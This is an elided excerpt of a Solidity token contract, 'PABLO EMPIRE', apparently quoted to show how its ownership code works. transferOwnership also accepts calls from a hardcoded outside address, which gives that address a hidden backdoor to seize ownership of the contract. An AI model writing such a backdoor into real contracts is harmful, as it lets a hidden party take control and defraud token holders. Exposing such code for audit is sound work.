...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xbb80FbB5F2696E2212763f98D1624213901FF35A));
...
contract PABLOEMPIRE is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "PBOE";
  string private _name = "PABLO EMPIRE";
